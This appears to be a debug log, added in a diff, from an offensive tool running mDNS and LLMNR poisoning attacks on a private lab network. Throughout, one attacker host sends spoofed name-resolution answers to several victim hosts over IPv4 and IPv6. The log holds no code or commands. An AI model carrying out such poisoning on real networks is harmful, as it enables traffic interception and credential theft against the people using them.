+2022-01-19 17:16:10.777 | DEBUG    | project.network.poison.poisonselector:do_poison:174 - Starting mdns poisoning attack using lhost: 192.168.253.135 rhost:192.168.253.138 ipv6:fe80::20c:29ff:fe0e:d73b
+            interface: ens33 mac_address:00:0c:29:0e:d7:3b
+2022-01-19 17:16:10.777 | DEBUG    | project.shell.igris:check_settable_variables_value:231 - Checking the correct value of the necessary settable variables 
+2022-01-19 17:16:10.783 | INFO     | project.network.poison.poisonengine.poisonlauncher:__create_mdns:80 - Running mdns poisoning in the background
+2022-01-19 17:16:10.785 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:start_mdns_poisoning:134 - Starting mdns poisoning...
+2022-01-19 17:16:41.373 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:91 - Packet crafted: 
+2022-01-19 17:16:41.374 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:92 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
+2022-01-19 17:16:41.374 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:94 - [36m(MDNS) Sending packet to 192.168.253.139[0m
+2022-01-19 17:16:41.409 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:91 - Packet crafted: 
+2022-01-19 17:16:41.409 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:92 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2022-01-19 17:16:41.409 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:94 - [36m(MDNS) Sending packet to fe80::ad5d:a0a0:f1d:bb1d[0m
+2022-01-19 17:16:42.381 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:91 - Packet crafted: 
+2022-01-19 17:16:42.381 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:92 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
+2022-01-19 17:16:42.382 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:91 - Packet crafted: 
+2022-01-19 17:16:42.382 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:92 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2022-01-19 17:16:44.393 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:91 - Packet crafted: 
+2022-01-19 17:16:44.393 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:92 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
+2022-01-19 17:16:44.395 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:91 - Packet crafted: 
+2022-01-19 17:16:44.395 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:92 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2022-01-19 17:16:56.433 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:91 - Packet crafted: 
+2022-01-19 17:16:56.433 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:92 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
+2022-01-19 17:16:56.434 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:94 - [36m(MDNS) Sending packet to 192.168.253.139[0m
+2022-01-19 17:16:56.468 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:91 - Packet crafted: 
+2022-01-19 17:16:56.468 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:92 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2022-01-19 17:16:56.468 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:94 - [36m(MDNS) Sending packet to fe80::ad5d:a0a0:f1d:bb1d[0m
+2022-01-19 17:16:56.503 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:91 - Packet crafted: 
+2022-01-19 17:16:56.504 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:92 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
+2022-01-19 17:16:56.508 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:91 - Packet crafted: 
+2022-01-19 17:16:56.508 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:92 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2022-01-19 17:16:57.438 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:91 - Packet crafted: 
+2022-01-19 17:16:57.439 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:92 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
+2022-01-19 17:16:57.440 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:91 - Packet crafted: 
+2022-01-19 17:16:57.440 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:92 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2022-01-19 17:17:00.815 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:91 - Packet crafted: 
+2022-01-19 17:17:00.816 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:92 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
+2022-01-19 17:17:00.817 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:91 - Packet crafted: 
+2022-01-19 17:17:00.817 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:92 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2022-01-19 17:17:03.102 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:91 - Packet crafted: 
+2022-01-19 17:17:03.102 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:92 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
+2022-01-19 17:17:03.102 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:94 - [36m(MDNS) Sending packet to 192.168.253.139[0m
+2022-01-19 17:17:03.144 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:91 - Packet crafted: 
+2022-01-19 17:17:03.144 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:92 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2022-01-19 17:17:03.144 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:94 - [36m(MDNS) Sending packet to fe80::ad5d:a0a0:f1d:bb1d[0m
+2022-01-19 17:17:03.176 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:91 - Packet crafted: 
+2022-01-19 17:17:03.177 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:92 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
+2022-01-19 17:17:03.178 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:91 - Packet crafted: 
+2022-01-19 17:17:03.178 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:92 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2022-01-19 17:17:04.096 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:91 - Packet crafted: 
+2022-01-19 17:17:04.097 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:92 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
+2022-01-19 17:17:04.100 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:91 - Packet crafted: 
+2022-01-19 17:17:04.101 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:92 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2022-01-19 17:17:26.949 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:91 - Packet crafted: 
+2022-01-19 17:17:26.950 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:92 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
+2022-01-19 17:17:26.950 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:94 - [36m(MDNS) Sending packet to 192.168.253.139[0m
+2022-01-19 17:17:26.980 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:91 - Packet crafted: 
+2022-01-19 17:17:26.980 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:92 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2022-01-19 17:17:26.981 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:94 - [36m(MDNS) Sending packet to fe80::ad5d:a0a0:f1d:bb1d[0m
+2022-01-19 17:17:27.012 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:91 - Packet crafted: 
+2022-01-19 17:17:27.013 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:92 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
+2022-01-19 17:17:27.015 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:91 - Packet crafted: 
+2022-01-19 17:17:27.015 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:92 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2022-01-19 17:17:42.921 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:91 - Packet crafted: 
+2022-01-19 17:17:42.921 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:92 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
+2022-01-19 17:17:42.921 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:94 - [36m(MDNS) Sending packet to 192.168.253.139[0m
+2022-01-19 17:17:42.952 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:91 - Packet crafted: 
+2022-01-19 17:17:42.952 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:92 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2022-01-19 17:17:42.953 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:94 - [36m(MDNS) Sending packet to fe80::ad5d:a0a0:f1d:bb1d[0m
+2022-01-19 17:17:47.029 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:91 - Packet crafted: 
+2022-01-19 17:17:47.029 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:92 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
+2022-01-19 17:17:47.031 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:91 - Packet crafted: 
+2022-01-19 17:17:47.031 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:92 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2022-01-19 17:17:47.033 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:91 - Packet crafted: 
+2022-01-19 17:17:47.033 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:92 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
+2022-01-19 17:17:47.035 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:91 - Packet crafted: 
+2022-01-19 17:17:47.035 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:92 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2022-01-19 17:17:48.044 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:91 - Packet crafted: 
+2022-01-19 17:17:48.044 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:92 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
+2022-01-19 17:17:48.046 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:91 - Packet crafted: 
+2022-01-19 17:17:48.047 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:92 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2022-01-19 17:17:48.049 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:91 - Packet crafted: 
+2022-01-19 17:17:48.049 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:92 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
+2022-01-19 17:17:48.051 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:91 - Packet crafted: 
+2022-01-19 17:17:48.051 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:92 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2022-01-19 17:17:55.068 | DEBUG    | project.network.poison.poisonselector:do_poison:174 - Starting mdns poisoning attack using lhost: 192.168.253.135 rhost:192.168.253.138 ipv6:fe80::20c:29ff:fe0e:d73b
+            interface: ens33 mac_address:00:0c:29:0e:d7:3b
+2022-01-19 17:17:55.069 | SUCCESS  | project.network.poison.poisonselector:__end_process_in_the_background:70 - Finishing attack in the background ...
+2022-01-19 17:18:46.882 | DEBUG    | project.network.poison.poisonselector:do_poison:174 - Starting mdns poisoning attack using lhost: 192.168.253.135 rhost:192.168.253.138 ipv6:fe80::20c:29ff:fe0e:d73b
+            interface: ens33 mac_address:00:0c:29:0e:d7:3b
+2022-01-19 17:18:46.885 | DEBUG    | project.shell.igris:check_settable_variables_value:231 - Checking the correct value of the necessary settable variables 
+2022-01-19 17:18:46.917 | INFO     | project.network.poison.poisonengine.poisoners.mdns:start_mdns_poisoning:134 - Starting mdns poisoning...
+2022-01-19 17:19:10.089 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:91 - Packet crafted: 
+2022-01-19 17:19:10.092 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:92 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
+2022-01-19 17:19:10.093 | INFO     | project.network.poison.poisonengine.poisoners.mdns:__send_packet:94 - [36m(MDNS) Sending packet to 192.168.253.139[0m
+2022-01-19 17:19:10.142 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:91 - Packet crafted: 
+2022-01-19 17:19:10.143 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:92 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2022-01-19 17:19:10.144 | INFO     | project.network.poison.poisonengine.poisoners.mdns:__send_packet:94 - [36m(MDNS) Sending packet to fe80::ad5d:a0a0:f1d:bb1d[0m
+2022-01-19 17:19:10.186 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:91 - Packet crafted: 
+2022-01-19 17:19:10.187 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:92 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
+2022-01-19 17:19:10.190 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:91 - Packet crafted: 
+2022-01-19 17:19:10.191 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:92 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2022-01-19 17:19:26.041 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:91 - Packet crafted: 
+2022-01-19 17:19:26.043 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:92 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
+2022-01-19 17:19:26.044 | INFO     | project.network.poison.poisonengine.poisoners.mdns:__send_packet:94 - [36m(MDNS) Sending packet to 192.168.253.139[0m
+2022-01-19 17:19:26.093 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:91 - Packet crafted: 
+2022-01-19 17:19:26.095 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:92 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2022-01-19 17:19:26.095 | INFO     | project.network.poison.poisonengine.poisoners.mdns:__send_packet:94 - [36m(MDNS) Sending packet to fe80::ad5d:a0a0:f1d:bb1d[0m
+2022-01-19 17:19:57.779 | DEBUG    | project.network.poison.poisonselector:do_poison:174 - Starting mdns poisoning attack using lhost: 192.168.253.135 rhost:192.168.253.138 ipv6:fe80::20c:29ff:fe0e:d73b
+            interface: ens33 mac_address:00:0c:29:0e:d7:3b
+2022-01-19 17:19:57.781 | DEBUG    | project.shell.igris:check_settable_variables_value:231 - Checking the correct value of the necessary settable variables 
+2022-01-19 17:19:57.813 | INFO     | project.network.poison.poisonengine.poisonlauncher:__create_llmnr:108 - Running llmnr poisoning in the background
+2022-01-19 17:19:57.823 | DEBUG    | project.network.poison.poisonengine.poisoners.llmnr:start_llmnr_poisoning:156 - Starting llmnr poisoning...
+2022-01-19 17:20:06.375 | DEBUG    | project.network.poison.poisonengine.poisoners.llmnr:__send_packet:113 - Packet crafted: 
+2022-01-19 17:20:06.377 | DEBUG    | project.network.poison.poisonengine.poisoners.llmnr:__send_packet:114 - Ether / IP / UDP 192.168.253.135:hostmon > 192.168.253.1:hostmon / LLMNRResponse
+2022-01-19 17:20:06.378 | DEBUG    | project.network.poison.poisonengine.poisoners.llmnr:__send_packet:116 - [36m(LLMNR) Sending packet to 192.168.253.1[0m
+2022-01-19 17:20:06.428 | DEBUG    | project.network.poison.poisonengine.poisoners.llmnr:__send_packet:113 - Packet crafted: 
+2022-01-19 17:20:06.430 | DEBUG    | project.network.poison.poisonengine.poisoners.llmnr:__send_packet:114 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:hostmon > fe80::ad5d:a0a0:f1d:bb1d:52372 / LLMNRResponse
+2022-01-19 17:20:06.431 | DEBUG    | project.network.poison.poisonengine.poisoners.llmnr:__send_packet:116 - [36m(LLMNR) Sending packet to fe80::ad5d:a0a0:f1d:bb1d[0m
+2022-01-19 17:20:06.473 | DEBUG    | project.network.poison.poisonengine.poisoners.llmnr:__send_packet:113 - Packet crafted: 
+2022-01-19 17:20:06.474 | DEBUG    | project.network.poison.poisonengine.poisoners.llmnr:__send_packet:114 - Ether / IP / UDP 192.168.253.135:hostmon > 192.168.253.139:52372 / LLMNRResponse
+2022-01-19 17:20:06.474 | DEBUG    | project.network.poison.poisonengine.poisoners.llmnr:__send_packet:116 - [36m(LLMNR) Sending packet to 192.168.253.139[0m
+2022-01-19 17:20:06.517 | DEBUG    | project.network.poison.poisonengine.poisoners.llmnr:__send_packet:113 - Packet crafted: 
+2022-01-19 17:20:06.518 | DEBUG    | project.network.poison.poisonengine.poisoners.llmnr:__send_packet:114 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:hostmon > fe80::ad5d:a0a0:f1d:bb1d:60859 / LLMNRResponse
+2022-01-19 17:20:06.522 | DEBUG    | project.network.poison.poisonengine.poisoners.llmnr:__send_packet:113 - Packet crafted: 
+2022-01-19 17:20:06.523 | DEBUG    | project.network.poison.poisonengine.poisoners.llmnr:__send_packet:114 - Ether / IP / UDP 192.168.253.135:hostmon > 192.168.253.139:60859 / LLMNRResponse
+2022-01-19 17:20:06.823 | DEBUG    | project.network.poison.poisonengine.poisoners.llmnr:__send_packet:113 - Packet crafted: 
+2022-01-19 17:20:06.825 | DEBUG    | project.network.poison.poisonengine.poisoners.llmnr:__send_packet:114 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:hostmon > fe80::ad5d:a0a0:f1d:bb1d:60859 / LLMNRResponse
+2022-01-19 17:20:06.829 | DEBUG    | project.network.poison.poisonengine.poisoners.llmnr:__send_packet:113 - Packet crafted: 
+2022-01-19 17:20:06.830 | DEBUG    | project.network.poison.poisonengine.poisoners.llmnr:__send_packet:114 - Ether / IP / UDP 192.168.253.135:hostmon > 192.168.253.139:60859 / LLMNRResponse
+2022-01-19 17:20:15.177 | DEBUG    | project.network.poison.poisonengine.poisoners.llmnr:__send_packet:113 - Packet crafted: 
+2022-01-19 17:20:15.178 | DEBUG    | project.network.poison.poisonengine.poisoners.llmnr:__send_packet:114 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:hostmon > fe80::ad5d:a0a0:f1d:bb1d:59204 / LLMNRResponse
+2022-01-19 17:20:15.179 | DEBUG    | project.network.poison.poisonengine.poisoners.llmnr:__send_packet:116 - [36m(LLMNR) Sending packet to fe80::ad5d:a0a0:f1d:bb1d[0m
+2022-01-19 17:20:15.215 | DEBUG    | project.network.poison.poisonengine.poisoners.llmnr:__send_packet:113 - Packet crafted: 
+2022-01-19 17:20:15.216 | DEBUG    | project.network.poison.poisonengine.poisoners.llmnr:__send_packet:114 - Ether / IP / UDP 192.168.253.135:hostmon > 192.168.253.139:59204 / LLMNRResponse
+2022-01-19 17:20:15.216 | DEBUG    | project.network.poison.poisonengine.poisoners.llmnr:__send_packet:116 - [36m(LLMNR) Sending packet to 192.168.253.139[0m
+2022-01-19 17:21:29.254 | DEBUG    | project.network.poison.poisonengine.poisoners.llmnr:__send_packet:113 - Packet crafted: 
+2022-01-19 17:21:29.256 | DEBUG    | project.network.poison.poisonengine.poisoners.llmnr:__send_packet:114 - Ether / IP / UDP 192.168.253.135:hostmon > 192.168.253.1:hostmon / LLMNRResponse
+2022-01-19 17:21:29.257 | DEBUG    | project.network.poison.poisonengine.poisoners.llmnr:__send_packet:116 - [36m(LLMNR) Sending packet to 192.168.253.1[0m
+2022-01-19 17:27:16.012 | DEBUG    | project.network.poison.poisonengine.poisoners.llmnr:__send_packet:113 - Packet crafted: 
+2022-01-19 17:27:16.013 | DEBUG    | project.network.poison.poisonengine.poisoners.llmnr:__send_packet:114 - Ether / IP / UDP 192.168.253.135:hostmon > 192.168.253.1:hostmon / LLMNRResponse
+2022-01-19 17:27:16.013 | DEBUG    | project.network.poison.poisonengine.poisoners.llmnr:__send_packet:116 - [36m(LLMNR) Sending packet to 192.168.253.1[0m
+2022-01-19 17:29:28.873 | DEBUG    | project.network.poison.poisonengine.poisoners.llmnr:__send_packet:113 - Packet crafted: 
+2022-01-19 17:29:28.876 | DEBUG    | project.network.poison.poisonengine.poisoners.llmnr:__send_packet:114 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:hostmon > fe80::e402:9b1f:9ad8:43cc:57368 / LLMNRResponse
+2022-01-19 17:29:28.877 | DEBUG    | project.network.poison.poisonengine.poisoners.llmnr:__send_packet:116 - [36m(LLMNR) Sending packet to fe80::e402:9b1f:9ad8:43cc[0m
+2022-01-19 17:29:28.927 | DEBUG    | project.network.poison.poisonengine.poisoners.llmnr:__send_packet:113 - Packet crafted: 
+2022-01-19 17:29:28.929 | DEBUG    | project.network.poison.poisonengine.poisoners.llmnr:__send_packet:114 - Ether / IP / UDP 192.168.253.135:hostmon > 192.168.253.137:57368 / LLMNRResponse
+2022-01-19 17:29:28.929 | DEBUG    | project.network.poison.poisonengine.poisoners.llmnr:__send_packet:116 - [36m(LLMNR) Sending packet to 192.168.253.137[0m
+2022-01-19 17:29:29.883 | DEBUG    | project.network.poison.poisonengine.poisoners.llmnr:__send_packet:113 - Packet crafted: 
+2022-01-19 17:29:29.885 | DEBUG    | project.network.poison.poisonengine.poisoners.llmnr:__send_packet:114 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:hostmon > fe80::e402:9b1f:9ad8:43cc:53186 / LLMNRResponse
+2022-01-19 17:29:29.891 | DEBUG    | project.network.poison.poisonengine.poisoners.llmnr:__send_packet:113 - Packet crafted: 
+2022-01-19 17:29:29.892 | DEBUG    | project.network.poison.poisonengine.poisoners.llmnr:__send_packet:114 - Ether / IP / UDP 192.168.253.135:hostmon > 192.168.253.137:53186 / LLMNRResponse
+2022-01-19 17:29:30.304 | DEBUG    | project.network.poison.poisonengine.poisoners.llmnr:__send_packet:113 - Packet crafted: 
+2022-01-19 17:29:30.306 | DEBUG    | project.network.poison.poisonengine.poisoners.llmnr:__send_packet:114 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:hostmon > fe80::e402:9b1f:9ad8:43cc:53186 / LLMNRResponse
+2022-01-19 17:29:30.311 | DEBUG    | project.network.poison.poisonengine.poisoners.llmnr:__send_packet:113 - Packet crafted: 
+2022-01-19 17:29:30.313 | DEBUG    | project.network.poison.poisonengine.poisoners.llmnr:__send_packet:114 - Ether / IP / UDP 192.168.253.135:hostmon > 192.168.253.137:53186 / LLMNRResponse
+2022-01-19 17:30:47.476 | DEBUG    | project.network.poison.poisonengine.poisoners.llmnr:__send_packet:113 - Packet crafted: 
+2022-01-19 17:30:47.477 | DEBUG    | project.network.poison.poisonengine.poisoners.llmnr:__send_packet:114 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:hostmon > fe80::ad5d:a0a0:f1d:bb1d:50968 / LLMNRResponse
+2022-01-19 17:30:47.478 | DEBUG    | project.network.poison.poisonengine.poisoners.llmnr:__send_packet:116 - [36m(LLMNR) Sending packet to fe80::ad5d:a0a0:f1d:bb1d[0m
+2022-01-19 17:30:47.519 | DEBUG    | project.network.poison.poisonengine.poisoners.llmnr:__send_packet:113 - Packet crafted: 
+2022-01-19 17:30:47.520 | DEBUG    | project.network.poison.poisonengine.poisoners.llmnr:__send_packet:114 - Ether / IP / UDP 192.168.253.135:hostmon > 192.168.253.139:50968 / LLMNRResponse
+2022-01-19 17:30:47.520 | DEBUG    | project.network.poison.poisonengine.poisoners.llmnr:__send_packet:116 - [36m(LLMNR) Sending packet to 192.168.253.139[0m
+2022-01-19 17:30:47.555 | DEBUG    | project.network.poison.poisonengine.poisoners.llmnr:__send_packet:113 - Packet crafted: 
+2022-01-19 17:30:47.556 | DEBUG    | project.network.poison.poisonengine.poisoners.llmnr:__send_packet:114 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:hostmon > fe80::ad5d:a0a0:f1d:bb1d:58988 / LLMNRResponse
+2022-01-19 17:30:47.558 | DEBUG    | project.network.poison.poisonengine.poisoners.llmnr:__send_packet:113 - Packet crafted: 
+2022-01-19 17:30:47.559 | DEBUG    | project.network.poison.poisonengine.poisoners.llmnr:__send_packet:114 - Ether / IP / UDP 192.168.253.135:hostmon > 192.168.253.139:58988 / LLMNRResponse
+2022-01-19 17:31:29.531 | DEBUG    | project.network.poison.poisonengine.poisoners.llmnr:__send_packet:113 - Packet crafted: 
+2022-01-19 17:31:29.531 | DEBUG    | project.network.poison.poisonengine.poisoners.llmnr:__send_packet:114 - Ether / IP / UDP 192.168.253.135:hostmon > 192.168.253.1:hostmon / LLMNRResponse
+2022-01-19 17:31:29.532 | DEBUG    | project.network.poison.poisonengine.poisoners.llmnr:__send_packet:116 - [36m(LLMNR) Sending packet to 192.168.253.1[0m
+2022-01-19 17:37:16.468 | DEBUG    | project.network.poison.poisonengine.poisoners.llmnr:__send_packet:113 - Packet crafted: 
+2022-01-19 17:37:16.469 | DEBUG    | project.network.poison.poisonengine.poisoners.llmnr:__send_packet:114 - Ether / IP / UDP 192.168.253.135:hostmon > 192.168.253.1:hostmon / LLMNRResponse
+2022-01-19 17:37:16.469 | DEBUG    | project.network.poison.poisonengine.poisoners.llmnr:__send_packet:116 - [36m(LLMNR) Sending packet to 192.168.253.1[0m
+2022-01-19 17:41:29.705 | DEBUG    | project.network.poison.poisonengine.poisoners.llmnr:__send_packet:113 - Packet crafted: 
+2022-01-19 17:41:29.705 | DEBUG    | project.network.poison.poisonengine.poisoners.llmnr:__send_packet:114 - Ether / IP / UDP 192.168.253.135:hostmon > 192.168.253.1:hostmon / LLMNRResponse
+2022-01-19 17:41:29.706 | DEBUG    | project.network.poison.poisonengine.poisoners.llmnr:__send_packet:116 - [36m(LLMNR) Sending packet to 192.168.253.1[0m
+2022-01-19 17:44:28.926 | DEBUG    | project.network.poison.poisonengine.poisoners.llmnr:__send_packet:113 - Packet crafted: 
+2022-01-19 17:44:28.927 | DEBUG    | project.network.poison.poisonengine.poisoners.llmnr:__send_packet:114 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:hostmon > fe80::e402:9b1f:9ad8:43cc:59739 / LLMNRResponse
+2022-01-19 17:44:28.927 | DEBUG    | project.network.poison.poisonengine.poisoners.llmnr:__send_packet:116 - [36m(LLMNR) Sending packet to fe80::e402:9b1f:9ad8:43cc[0m
+2022-01-19 17:44:28.956 | DEBUG    | project.network.poison.poisonengine.poisoners.llmnr:__send_packet:113 - Packet crafted: 
+2022-01-19 17:44:28.956 | DEBUG    | project.network.poison.poisonengine.poisoners.llmnr:__send_packet:114 - Ether / IP / UDP 192.168.253.135:hostmon > 192.168.253.137:59739 / LLMNRResponse
+2022-01-19 17:44:28.957 | DEBUG    | project.network.poison.poisonengine.poisoners.llmnr:__send_packet:116 - [36m(LLMNR) Sending packet to 192.168.253.137[0m
+2022-01-19 17:44:29.939 | DEBUG    | project.network.poison.poisonengine.poisoners.llmnr:__send_packet:113 - Packet crafted: 
+2022-01-19 17:44:29.940 | DEBUG    | project.network.poison.poisonengine.poisoners.llmnr:__send_packet:114 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:hostmon > fe80::e402:9b1f:9ad8:43cc:65535 / LLMNRResponse
+2022-01-19 17:44:29.940 | DEBUG    | project.network.poison.poisonengine.poisoners.llmnr:__send_packet:116 - [36m(LLMNR) Sending packet to fe80::e402:9b1f:9ad8:43cc[0m
+2022-01-19 17:44:29.975 | DEBUG    | project.network.poison.poisonengine.poisoners.llmnr:__send_packet:113 - Packet crafted: 
+2022-01-19 17:44:29.976 | DEBUG    | project.network.poison.poisonengine.poisoners.llmnr:__send_packet:114 - Ether / IP / UDP 192.168.253.135:hostmon > 192.168.253.137:65535 / LLMNRResponse
+2022-01-19 17:44:29.976 | DEBUG    | project.network.poison.poisonengine.poisoners.llmnr:__send_packet:116 - [36m(LLMNR) Sending packet to 192.168.253.137[0m
+2022-01-19 17:45:47.570 | DEBUG    | project.network.poison.poisonengine.poisoners.llmnr:__send_packet:113 - Packet crafted: 
